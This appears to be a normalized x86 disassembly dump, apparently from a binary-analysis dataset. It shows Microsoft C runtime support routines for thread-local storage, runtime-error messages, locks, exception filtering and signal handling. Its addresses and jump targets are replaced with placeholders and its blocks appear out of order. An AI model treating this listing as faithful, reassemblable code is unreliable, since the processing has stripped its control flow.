mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_4116dd
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_411773
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_411dc6
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_4117b0
push 0xc
push r--data
call sub_412340
push r--data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_41888d
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41185b
call sub_412385
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_411864
push esi
push edi
call [ GetLastError@IAT ]
mov edi eax
call sub_411749
push [ rw-data ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_413797
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_40fdab
pop ecx
xor esi esi
push 0x0
push esi
call sub_4117b0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4118ff
push 0x8
push r--data
call sub_412340
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_412385
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_40fdab
pop ecx
push 0xd
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40fdab
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411a0b
push 0xc
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411a17
push esi
call sub_40fdab
pop ecx
push edi
call sub_418913
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40fdab
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41874d
pop ecx
sub_411a20
push edi
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_411773
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_411740
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_40e31c
push [ rw-data ]
call sub_411671
push [ rw-data ]
mov [ rw-data ] eax
call sub_411671
push [ rw-data ]
mov [ rw-data ] eax
call sub_411671
push [ rw-data ]
mov [ rw-data ] eax
call sub_411671
add esp 0x10
mov [ rw-data ] eax
call sub_411d7d
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_411773
push sub_4118ff
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0x214
push 0x1
call sub_413797
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_4117b0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_411ba4
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_419967
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_419967
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_415b90
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_415600
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
push esi
call sub_415b90
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_415600
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_415b90
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_4198b4
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_411f2e
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_419843
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push ebp
call sub_4196a5
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
push r--data
push ebx
push ebp
call sub_419843
add esp 0xc
test eax eax
je r-xdata
sub_411d44
push 0x3
call sub_419967
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_411ba4
push 0xff
call sub_411ba4
pop ecx
pop ecx
push 0x3
call sub_419967
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_411d7d
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_412928
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_411dc6
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_40fdab
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_411e30
push 0xc
push r--data
call sub_412340
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_411d44
push 0x1e
call sub_411ba4
push 0xff
call sub_40e0aa
push 0x18
call sub_413757
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_412089
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_412385
retn
push edi
call sub_40fdab
pop ecx
push 0xfa0
push edi
call sub_412928
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40fdab
pop ecx
call sub_412089
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411eea
mov eax [ ebp - 0x1c ]
sub_411ef3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_411e30
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_40e060
pop ecx
sub_411f2e
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40fb30
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_413965
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_4199ad
pop ecx
sub_41202a
push ebp
mov ebp esp
push [ rw-data ]
call sub_4116dd
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_4199ad
pop ecx
pop ebp
jmp sub_411f2e
pop ebp
jmp eax
sub_41204e
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jl r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_4120cd
push ecx
push ebx
push ebp
push esi
push edi
push [ rw-data ]
call sub_4116dd
push [ rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
call sub_4116dd
mov edi eax
cmp edi esi
pop ecx
pop ecx
jb r-xdata
xor eax eax
mov ebx edi
sub ebx esi
lea ebp [ ebx + 0x4 ]
cmp ebp 0x4
jb r-xdata
push esi
call sub_4199b5
mov esi eax
cmp esi ebp
pop ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov [ edi ] esi
add edi 0x4
push edi
call sub_411671
mov [ rw-data ] eax
pop ecx
mov eax esi
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push [ esp + 0x14 ]
call sub_4137df
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
push [ esp + 0x14 ]
call sub_4137df
test eax eax
pop ecx
pop ecx
je r-xdata
sar ebx 0x2
push eax
lea edi [ eax + ebx * 4 ]
call sub_411671
pop ecx
mov [ rw-data ] eax
sub_41217a
push esi
push 0x4
push 0x20
call sub_413797
mov esi eax
push esi
call sub_411671
add esp 0xc
test esi esi
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4121a9
push 0xc
push r--data
call sub_412340
call sub_40e0bf
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4120cd
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4121df
mov eax [ ebp - 0x1c ]
call sub_412385
retn
sub_4121f7
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_41221b
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_41223f
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_411671
add edi 0x4
cmp edi 0x28
pop ecx
mov [ esi ] eax
jb r-xdata
pop edi
pop esi
retn
sub_412260
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_412290
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_4122d2
push 0x8
push r--data
call sub_412340
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_412260
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_412290
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_412385
retn
sub_412340
push sub_4123a0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4123a0
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_413965
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_413965
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_415b6c
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_415b22
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_413965
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_413965
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_415b52
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_415b6c
mov eax [ esp + 0x2c ]
push rw-data
call sub_4122d2
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_413965
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_413965
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_41b65d
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_412581
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_411864
mov esi eax
test esi esi
jne r-xdata
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
pop esi
leave
retn
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
cmp eax 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_412709
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_41274a
push 0x20
push r--data
call sub_412340
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_411864
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_412385
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_412709
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40e2ed
mov [ ebp - 0x1c ] 0x1
push eax
call sub_4116dd
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_412089
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41202a
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_411ef3
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_4116d4
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4128be
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_412928
push 0x14
push r--data
call sub_412340
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_4116dd
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_40e109
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_412385
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_411f2e
add esp 0x14
mov esi sub_412918
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call sub_411671
pop ecx
mov [ rw-data ] eax
sub_4129f7
push [ rw-data ]
call sub_4116dd
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_412a19
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40ebab
push eax
call sub_419b54
test eax eax
pop ecx
pop ecx
je r-xdata
xor eax eax
pop esi
retn
call sub_40e4b7
add eax 0x20
cmp esi eax
jne r-xdata
call sub_40e4b7
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_413757
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
pop edi
xor eax eax
pop ebx
inc eax
pop esi
retn
sub_412aaf
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
push esi
mov esi [ esp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_40f31d
and [ esi + 0xc ] 0xffffeeff
